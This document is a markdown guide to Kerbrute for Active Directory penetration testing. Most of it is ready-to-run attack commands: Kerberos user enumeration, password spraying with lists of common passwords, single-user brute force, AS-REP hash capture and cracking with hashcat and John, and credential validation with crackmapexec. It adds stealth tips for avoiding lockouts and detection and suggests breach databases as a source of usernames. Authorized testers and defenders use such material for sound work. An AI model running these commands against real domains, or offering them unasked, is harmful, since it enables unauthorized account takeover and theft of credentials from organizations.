# Kerbrute Techniques

This document covers advanced techniques for using Kerbrute in Active Directory penetration testing scenarios, including the underlying Kerberos mechanisms that make these attacks possible.

## Table of Contents

- [How Kerberos Pre-Authentication Works](#how-kerberos-pre-authentication-works)
- [User Enumeration (userenum)](#user-enumeration-userenum)
- [Password Spraying (passwordspray)](#password-spraying-passwordspray)
- [Brute Force Single User (bruteuser)](#brute-force-single-user-bruteuser)
- [Building Username Lists](#building-username-lists)
- [AS-REP Roasting Workflow](#as-rep-roasting-workflow)
- [Domain Configuration Scenarios](#domain-configuration-scenarios)
- [Output Parsing](#output-parsing)

---

## How Kerberos Pre-Authentication Works

Understanding Kerberos pre-authentication is essential for effective use of Kerbrute.

### The AS-REQ/AS-REP Exchange

When a user authenticates via Kerberos, the following occurs:

1. **AS-REQ (Authentication Service Request)**: Client sends username to KDC
2. **KDC Validation**: Domain Controller checks if username exists
3. **Pre-Auth Challenge**: If user exists AND has pre-auth enabled, KDC expects encrypted timestamp
4. **AS-REP (Authentication Service Reply)**: KDC returns TGT if authentication succeeds

### Pre-Authentication Mechanism

```
Client                                    KDC (Domain Controller)
   |                                              |
   |-------- AS-REQ (username only) ------------>|
   |                                              |
   |<------- KRB5KDC_ERR_PREAUTH_REQUIRED -------|  (User exists, needs preauth)
   |                                              |
   |-------- AS-REQ (username + enc_timestamp) ->|
   |                                              |
   |<------- AS-REP (TGT) -----------------------|  (Success)
```

### Why User Enumeration Does Not Trigger Lockouts

Kerbrute's user enumeration exploits a fundamental Kerberos behavior:

| Error Response | Meaning | Lockout Impact |
|----------------|---------|----------------|
| `KRB5KDC_ERR_PREAUTH_REQUIRED` | User exists, pre-auth required | **None** - no password attempt |
| `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` | User does not exist | **None** - user not found |
| `KRB5KDC_ERR_CLIENT_REVOKED` | Account disabled/locked | **None** - status check only |

The critical insight: **The KDC reveals user existence BEFORE any password validation occurs**. This is by design in Kerberos - the pre-authentication requirement is communicated to valid users so they know to encrypt their timestamp.

### Event Log Footprint

| Attack Type | Event ID | Description |
|-------------|----------|-------------|
| User Enumeration | 4768 | Kerberos TGT request (if auditing enabled) |
| Password Spray | 4771 | Kerberos pre-auth failure |
| Successful Auth | 4768 | Kerberos TGT request (success) |

Note: Event ID 4625 (failed logon) is NOT generated for Kerberos pre-auth failures, making this stealthier than NTLM-based attacks.

---

## User Enumeration (userenum)

User enumeration identifies valid domain accounts without risking account lockouts.

### Basic Enumeration

```bash
# Enumerate users against domain controller
kerbrute userenum -d corp.local --dc 10.10.10.1 users.txt

# Auto-discover DC via DNS
kerbrute userenum -d corp.local users.txt

# Verbose output (show failures)
kerbrute userenum -d corp.local -v users.txt
```

### High-Performance Enumeration

```bash
# Increase threads for large lists (default: 10)
kerbrute userenum -d corp.local -t 50 users.txt

# Lower threads for stability on slow networks
kerbrute userenum -d corp.local -t 5 users.txt
```

### Capture AS-REP Hashes During Enumeration

When enumerating, Kerbrute can capture AS-REP hashes for accounts with pre-auth disabled:

```bash
# Save AS-REP hashes for offline cracking
kerbrute userenum -d corp.local --hash-file asrep_hashes.txt users.txt
```

This outputs hashes in hashcat format (mode 18200):
```
$krb5asrep$23$svc_backup@CORP.LOCAL:1a2b3c...
```

### Output Options

```bash
# Save valid users to file
kerbrute userenum -d corp.local -o valid_users.txt users.txt

# JSON output for parsing
kerbrute userenum -d corp.local --json users.txt | tee results.json
```

---

## Password Spraying (passwordspray)

Password spraying tests a single password against multiple accounts, minimizing lockout risk.

### Basic Password Spray

```bash
# Test single password against user list
kerbrute passwordspray -d corp.local users.txt 'Summer2024!'

# Specify domain controller
kerbrute passwordspray -d corp.local --dc 10.10.10.1 users.txt 'Welcome1'
```

### Safe Spraying Strategies

**IMPORTANT**: Password spraying DOES increment the failed login counter. Plan accordingly.

#### Strategy 1: Respect Lockout Policy

First, enumerate the domain password policy:

```bash
# With credentials (e.g., from AS-REP roasting)
crackmapexec smb 10.10.10.1 -u user -p pass --pass-pol

# Via LDAP anonymous bind (if allowed)
ldapsearch -x -H ldap://10.10.10.1 -b "dc=corp,dc=local" "(objectClass=domain)" lockoutThreshold lockoutDuration
```

Example policy: `lockoutThreshold=5`, `lockoutDuration=30 minutes`

Safe approach: **Max 2-3 attempts per lockout window**

```bash
# First spray
kerbrute passwordspray -d corp.local users.txt 'Spring2024!'

# Wait for lockout window to reset (e.g., 30+ minutes)
sleep 1800

# Second spray
kerbrute passwordspray -d corp.local users.txt 'Summer2024!'
```

#### Strategy 2: Use Safe Mode

```bash
# Abort immediately if any lockout detected
kerbrute passwordspray -d corp.local --safe users.txt 'Password123'
```

#### Strategy 3: Throttled Spraying

```bash
# Add delay between attempts (forces single-threaded)
# 1000ms = 1 second between each attempt
kerbrute passwordspray -d corp.local --delay 1000 users.txt 'Welcome1!'

# Longer delay for maximum stealth
kerbrute passwordspray -d corp.local --delay 5000 users.txt 'Company2024!'
```

#### Strategy 4: Targeted User List

Spray only against accounts less likely to lock out or more likely to have weak passwords:

```bash
# Service accounts (often have weak/default passwords)
kerbrute passwordspray -d corp.local service_accounts.txt 'ServicePass1'

# Recently created accounts
kerbrute passwordspray -d corp.local new_users.txt 'Welcome1!'

# High-value targets only
kerbrute passwordspray -d corp.local admins.txt 'Admin123!'
```

### Common Password Patterns to Try

```bash
# Seasonal passwords
kerbrute passwordspray -d corp.local users.txt 'Winter2024!'
kerbrute passwordspray -d corp.local users.txt 'Spring2024!'
kerbrute passwordspray -d corp.local users.txt 'Summer2024!'
kerbrute passwordspray -d corp.local users.txt 'Fall2024!'

# Company name variations
kerbrute passwordspray -d corp.local users.txt 'Corp2024!'
kerbrute passwordspray -d corp.local users.txt 'Corporate1'

# Default/reset passwords
kerbrute passwordspray -d corp.local users.txt 'Welcome1!'
kerbrute passwordspray -d corp.local users.txt 'Password1!'
kerbrute passwordspray -d corp.local users.txt 'Changeme1!'

# Keyboard patterns
kerbrute passwordspray -d corp.local users.txt 'Qwerty123!'
```

---

## Brute Force Single User (bruteuser)

Brute force a single account with a password list. **Use with extreme caution**.

### When to Use

- Target has no lockout policy (rare)
- Service account without lockout
- Testing specific high-value account after reconnaissance
- Lab/CTF environments

### Basic Brute Force

```bash
# Brute force single user
kerbrute bruteuser -d corp.local passwords.txt administrator

# With DC specification
kerbrute bruteuser -d corp.local --dc 10.10.10.1 passwords.txt svc_backup
```

### Throttled Brute Force

```bash
# Add delay to avoid detection/rate limiting
kerbrute bruteuser -d corp.local --delay 2000 passwords.txt targetuser
```

### Combined Username:Password File

```bash
# Test username:password combinations from file or stdin
kerbrute bruteforce -d corp.local combos.txt

# From stdin (useful for custom generators)
cat combos.txt | kerbrute bruteforce -d corp.local -
```

Format for combo file:
```
administrator:Winter2024!
svc_backup:Backup123
john.smith:Welcome1
```

---

## Building Username Lists

Effective username lists are critical for both enumeration and spraying success.

### Common Naming Conventions

```bash
# First.Last
john.smith
jane.doe

# FirstInitialLast
jsmith
jdoe

# First_Last
john_smith
jane_doe

# FirstLast
johnsmith
janedoe

# Last.First
smith.john
doe.jane

# FirstInitial.Last
j.smith
j.doe
```

### Generate Username Variations

Given a list of full names, generate common formats:

```bash
# names.txt contains:
# John Smith
# Jane Doe

# Using username-anarchy
username-anarchy --input-file names.txt --select-format first.last,flast,f.last

# Using custom script
while read first last; do
    first=$(echo "$first" | tr '[:upper:]' '[:lower:]')
    last=$(echo "$last" | tr '[:upper:]' '[:lower:]')
    echo "${first}.${last}"
    echo "${first:0:1}${last}"
    echo "${first}${last}"
    echo "${last}.${first}"
done < names.txt > usernames.txt
```

### Sources for Name Discovery

1. **LinkedIn**: Company employees page
2. **Company website**: About/Team pages
3. **Hunter.io / Phonebook.cz**: Email format discovery
4. **Document metadata**: `exiftool` on downloaded PDFs/Office docs
5. **Breach databases**: Historical email addresses
6. **OSINT tools**: theHarvester, recon-ng

### Email to Username Conversion

```bash
# Extract usernames from email format
# john.smith@corp.local -> john.smith
cat emails.txt | cut -d'@' -f1 > usernames.txt
```

### Default/Built-in Accounts

Always include these in enumeration:

```
administrator
admin
guest
krbtgt
defaultaccount
```

### Service Account Patterns

```
svc_backup
svc_sql
svc_web
svc_exchange
sqlservice
backupservice
webservice
service
backup
sql
```

---

## AS-REP Roasting Workflow

Kerbrute can identify AS-REP roastable accounts during enumeration.

### Complete Workflow

#### Step 1: Enumerate Users and Capture Hashes

```bash
# Enumerate and save AS-REP hashes
kerbrute userenum -d corp.local --hash-file asrep.txt users.txt -o valid_users.txt

# Check captured hashes
cat asrep.txt
```

#### Step 2: Alternatively, Use Impacket After Enumeration

```bash
# Use valid users found by kerbrute
GetNPUsers.py corp.local/ -usersfile valid_users.txt -no-pass -dc-ip 10.10.10.1 -format hashcat -outputfile asrep_hashes.txt
```

#### Step 3: Crack AS-REP Hashes

```bash
# Hashcat mode 18200
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

#### Step 4: Validate Cracked Credentials

```bash
# Test credentials
kerbrute passwordspray -d corp.local asrep_users.txt 'CrackedPassword123'

# Or use crackmapexec
crackmapexec smb 10.10.10.1 -u username -p 'CrackedPassword123' -d corp.local
```

### Why AS-REP Roasting Works

Accounts with "Do not require Kerberos preauthentication" enabled will return an AS-REP containing encrypted data (the TGT session key) encrypted with the user's password hash. This can be cracked offline.

```
User with PreAuth Disabled:
AS-REQ (username) -> KDC
KDC -> AS-REP (contains encrypted session key)
                    ^-- Encrypted with user's hash, crackable offline
```

---

## Domain Configuration Scenarios

### Single Domain

```bash
kerbrute userenum -d corp.local --dc 10.10.10.1 users.txt
```

### Multiple Domain Controllers

```bash
# Specify primary DC
kerbrute userenum -d corp.local --dc dc01.corp.local users.txt

# If primary fails, try backup
kerbrute userenum -d corp.local --dc dc02.corp.local users.txt
```

### Child/Parent Domains

```bash
# Enumerate child domain
kerbrute userenum -d child.corp.local --dc 10.10.20.1 users.txt

# Enumerate parent domain
kerbrute userenum -d corp.local --dc 10.10.10.1 users.txt
```

### Cross-Forest Enumeration

```bash
# Enumerate trusted forest
kerbrute userenum -d partner.com --dc 192.168.1.1 users.txt
```

### Behind Proxychains/Tunnel

```bash
# Through SOCKS proxy
proxychains kerbrute userenum -d corp.local --dc 10.10.10.1 users.txt

# Note: May need to reduce threads due to proxy latency
proxychains kerbrute userenum -d corp.local --dc 10.10.10.1 -t 5 users.txt
```

### Force RC4 Encryption (Downgrade)

Some environments may require or work better with RC4:

```bash
kerbrute userenum -d corp.local --downgrade users.txt
```

---

## Output Parsing

### Standard Output Format

```
2024/01/15 10:30:45 >  [+] VALID USERNAME:       jsmith@corp.local
2024/01/15 10:30:45 >  [+] VALID USERNAME:       admin@corp.local
2024/01/15 10:30:46 >  [+] jsmith@corp.local has no pre auth required. Dumping hash to hashes.txt
2024/01/15 10:30:47 >  [+] VALID LOGIN:  svc_backup@corp.local:Backup123!
```

### Extract Valid Usernames

```bash
# From output file
grep "VALID USERNAME" kerbrute_output.txt | awk '{print $NF}' > valid_users.txt

# Real-time extraction
kerbrute userenum -d corp.local users.txt 2>&1 | tee output.txt | grep "VALID USERNAME" | awk '{print $NF}'

# Remove domain suffix
grep "VALID USERNAME" output.txt | awk '{print $NF}' | cut -d'@' -f1 > valid_users_nodomain.txt
```

### Extract Valid Credentials

```bash
# Get successful logins
grep "VALID LOGIN" kerbrute_output.txt | awk '{print $NF}'

# Format as username:password
grep "VALID LOGIN" output.txt | awk -F': ' '{print $2}'
```

### Extract AS-REP Roastable Users

```bash
# Users without pre-auth
grep "no pre auth required" kerbrute_output.txt | awk '{print $2}'
```

### JSON Output Parsing

```bash
# Enable JSON output
kerbrute userenum -d corp.local --json users.txt > results.json

# Parse with jq
cat results.json | jq -r 'select(.valid == true) | .username'
```

### One-Liner: Enumerate and Spray

```bash
# Enumerate, extract valid users, then spray
kerbrute userenum -d corp.local users.txt 2>&1 | \
    grep "VALID USERNAME" | awk '{print $NF}' | cut -d'@' -f1 > found_users.txt && \
    kerbrute passwordspray -d corp.local found_users.txt 'Welcome1!'
```

---

## Quick Reference

### User Enumeration Checklist

1. Build comprehensive username list (naming conventions + defaults + service accounts)
2. Run enumeration with hash capture: `kerbrute userenum -d domain --hash-file hashes.txt users.txt`
3. Save valid users: `-o valid_users.txt`
4. Check for AS-REP hashes in hash file
5. Crack any captured hashes

### Password Spray Checklist

1. Enumerate password policy first
2. Calculate safe spray frequency (threshold - 2 per window)
3. Start with most common patterns (seasonal, company name, defaults)
4. Use `--safe` flag to abort on lockout
5. Consider `--delay` for stealth
6. Document spray times for lockout tracking

### Common Errors

| Error | Cause | Solution |
|-------|-------|----------|
| `KDC_ERR_WRONG_REALM` | Wrong domain name | Verify domain FQDN |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | DC not found | Specify `--dc` directly |
| Connection timeout | Network issue / firewall | Check connectivity to port 88 |
| `KDC_ERR_CLIENT_REVOKED` | Account disabled/locked | Remove from list |
